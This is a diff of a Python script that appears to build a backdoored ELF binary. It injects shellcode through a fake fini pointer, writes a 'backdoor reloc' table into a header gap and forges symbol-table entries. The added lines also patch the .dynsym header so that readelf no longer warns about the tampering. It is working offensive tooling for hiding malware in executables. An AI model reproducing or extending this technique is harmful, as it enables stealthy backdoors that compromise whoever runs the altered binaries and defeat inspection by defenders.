@@ -312,11 +312,6 @@ print(f"Inject Fini Shellcode Size: {len(prepare_sc)}")
 print(f"Payload Size: {len(payload)}")
 assert time_ptr_buf.address + time_ptr_buf.size == payload_buf.address
 
-stage2.p8(stage2.symtab(SYMBOL_0) + 4, (SYMBOL_BINDINGS.LOCAL.value << 4) | SYMBOL_TYPES.NOTYPE.value)
-stage2.p16(stage2.symtab(SYMBOL_0) + 6, SYMBOL_SECTION_INDEX.ABS.value)  # shndx
-stage2.p64(stage2.symtab(SYMBOL_0) + 16, len(original_jmprel) - ELF64_RELA_SIZE)  # size
-stage2.p64(stage2.symtab(SYMBOL_2) + 16, 8)  # size
-
 backup_jmprel_buf = hdr_gap.alloc(len(original_jmprel), "backup jmprel").write(original_jmprel)
 fake_fini_value_buf = hdr_gap.alloc(8, "fake fini value").write(p64(payload_buf.address + GARBAGE_CODE_SIZE))
 
@@ -385,6 +380,19 @@ assert len(packed) < len(original_jmprel)
 backdoor_reloc = hdr_gap.alloc(len(original_jmprel), "backdoor reloc").write(packed)
 
 # --- First layer of decoding below
+
+stage2.p8(stage2.symtab(SYMBOL_0) + 4, (SYMBOL_BINDINGS.LOCAL.value << 4) | SYMBOL_TYPES.NOTYPE.value)
+stage2.p16(stage2.symtab(SYMBOL_0) + 6, SYMBOL_SECTION_INDEX.ABS.value)  # shndx
+stage2.p64(stage2.symtab(SYMBOL_0) + 16, len(original_jmprel) - ELF64_RELA_SIZE)  # size
+stage2.p64(stage2.symtab(SYMBOL_2) + 16, 8)  # size
+
+# Patch sh_info of .dynsym to avoid "readelf: Warning: local symbol 36 found at index >= .dynsym's sh_info value of 1"
+stage2.p32_off(
+    stage2.header.e_shoff
+    + stage2.header.e_shentsize * stage2.sections.index(stage2.get_section_by_name(".dynsym"))
+    + 44,
+    stage2.symidx[SYMBOL_0] + 1,
+)
 
 new_rela = [Relocation(stage2.symtab(SYMBOL_0) + 8, RTYPE.RELATIVE, addend=backdoor_reloc.address)]
 new_rela.extend(map(Relocation.parse, lists.group(rela_dyn.header.sh_entsize, original_rela)))
